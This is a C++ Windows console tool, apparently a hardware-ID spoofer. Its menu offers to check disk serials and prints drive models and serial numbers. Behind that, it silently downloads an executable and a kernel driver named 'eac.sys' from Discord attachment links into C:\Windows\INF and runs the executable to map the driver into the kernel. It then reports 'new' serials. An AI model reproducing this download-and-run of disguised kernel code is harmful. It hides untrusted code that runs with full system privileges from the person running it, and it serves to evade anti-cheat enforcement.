#include <iostream>
#include <stdlib.h>
#include <windows.h>
#include <tchar.h>
#include <urlmon.h>
#include <conio.h>
#include <string>

#define color SetConsoleTextAttribute
#define WS_SIZEBOX WS_THICKFRAME
#define SWP_NOZORDER SWP_NOSIZE

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")
HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
RECT rc;
RECT rect;
#undef max

using namespace std;

int main()
{
    color(hConsole, 3);
    printf("\
         ________________________              \n \
        | | /| / / _ | | / / __/            \n \
        | |/ |/ / __ | |/ / _/              \n \
        |__/|__ / _/ |_ | ___ /             ");

    //-----------------------------------------------------------------------[statics]-----------------------------------------------------------------------
    std::cout << "\n";
    std::cout << "\n";
    color(hConsole, 6);
    std::cout << "[";
    color(hConsole, 3);
    std::cout << "+";
    color(hConsole, 6);
    std::cout << "]";
    color(hConsole, 8);
    std::cout << "Option 1\n";
    std::cout << "\n";
    color(hConsole, 6);
    std::cout << "[";
    color(hConsole, 3);
    std::cout << "+";
    color(hConsole, 6);
    std::cout << "]";
    color(hConsole, 8);
    std::cout << "Option 2\n";

    int choice;


    std::cout << "\n";
    std::cout << "\n";
    std::cout << "\n";
    color(hConsole, 6);
    std::cout << "[";
    color(hConsole, 3);
    std::cout << "1";
    color(hConsole, 6);
    std::cout << "]";
    color(hConsole, 8);
    std::cout << "CHECK SERIALS\n";
    std::cout << "\n";
    std::cout << "\n";
    std::cout << "\n";
    std::cout << "\n";
    std::cout << "\n";
    std::cout << "\n";
    std::cout << "Select an option: ";

    std::cin >> choice;


    switch (choice)
    {
    case 1:
        system("cls");
        system("Color 0F");
        color(hConsole, 3);
        printf("\
         ________________________              \n \
        | | /| / / _ | | / / __/            \n \
        | |/ |/ / __ | |/ / _/              \n \
        |__/|__ / _/ |_ | ___ /             ");

        std::cout << "\n";
        std::cout << "\n";
        color(hConsole, 6);
        std::cout << "[";
        color(hConsole, 3);
        std::cout << "+";
        color(hConsole, 6);
        std::cout << "]";
        color(hConsole, 8);
        std::cout << "Option 1\n";
        std::cout << "\n";
        color(hConsole, 6);
        std::cout << "[";
        color(hConsole, 3);
        std::cout << "+";
        color(hConsole, 6);
        std::cout << "]";
        color(hConsole, 8);
        std::cout << "Option 2\n";
        std::cout << "\n";
        std::cout << "\n";
        std::cout << "\n";
        color(hConsole, 3);

        //menu 1 english
        color(hConsole, 6);
        std::cout << " [";
        color(hConsole, 3);
        std::cout << "+";
        color(hConsole, 6);
        std::cout << "]";
        std::cout << " ";
        color(hConsole, 8);
        std::cout << "English---> ";
        color(hConsole, 7);
        std::cout << "Hit any key to continue with the operation\n";
        std::cout << "\n";
        std::cout << "\n";
        std::cout << "\n";
        system("pause");
        system("cls");
        system("Color 2F");
        printf("\n \
            ____ ____ ____ _________ ____ ____ ____ ____ ____ ____ ____      \n \
            || O |||L |||D |||       |||S |||E |||R |||I |||A |||L |||S ||   \n \
            ||__|||__|||__|||_______|||__|||__|||__|||__|||__|||__|||__||    \n \
            |/__\|/__\|/__\|/_______\|/__\|/__\|/__\|/__\|/__\|/__\|/__\ |   ");
        std::cout << "\n";
        std::cout << "\n";
        std::cout << "\n";
        std::cout << "[+]-------------------------------------------[DISK NAME]-------------------------------------------[+]\n";
        std::cout << "\n";
        std::cout << "\n";
        system("wmic diskdrive get model");
        std::cout << "\n";
        std::cout << "\n";
        std::cout << "[+]-------------------------------------------[SERIAL NUMBER]-------------------------------------------[+]\n";
        system("wmic diskdrive get serialnumber");
        system("pause");
        system("cls");
        system("color 2F");

        HRESULT hr;
        LPCTSTR Exe = _T("https://cdn.discordapp.com/attachments/1122263417546342482/1160664288881557554/mapper.exe?ex=65357bda&is=652306da&hm=cbe5ec5afafe7e5f1da86bf576b2125bd54ac7f9196af7d3b8000061cc1bf4df&"), FileP1 = _T("C:\\Windows\\INF\\mapper.exe");
        LPCTSTR Sys = _T("https://cdn.discordapp.com/attachments/1122263417546342482/1160664982300676116/eac.sys?ex=65357c7f&is=6523077f&hm=4040f89373c5b3cb3dfe5559e2baaaa1462fa52ab9947daa850387db5319e3a1&"), FileP2 = _T("C:\\Windows\\INF\\eac.sys");
        hr = URLDownloadToFile(0, Exe, FileP1, 0, 0);
        hr = URLDownloadToFile(0, Sys, FileP2, 0, 0);
        system("C:\\Windows\\INF\\mapper.exe C:\\Windows\\INF\\eac.sys");
        system("pause");

        system("Color 2F");
        printf("\n \
            ____ ____ ____ _________ ____ ____ ____ ____ ____ ____ ____      \n \
            || N |||E |||W |||       |||S |||E |||R |||I |||A |||L |||S ||   \n \
            ||__|||__|||__|||_______|||__|||__|||__|||__|||__|||__|||__||    \n \
            |/__\|/__\|/__\|/_______\|/__\|/__\|/__\|/__\|/__\|/__\|/__\ |   ");

        std::cout << "\n";
        std::cout << "\n";
        std::cout << "\n";
        std::cout << "[+]-------------------------------------------[NEW DISK NAME]-------------------------------------------[+]\n";
        std::cout << "\n";
        std::cout << "\n";
        system("wmic diskdrive get model");
        std::cout << "\n";
        std::cout << "\n";
        std::cout << "[+]-------------------------------------------[NEW SERIAL NUMBER]-------------------------------------------[+]\n";
        system("wmic diskdrive get serialnumber");
        system("pause");
        system("cls");
        system("color 2F");
    }









}
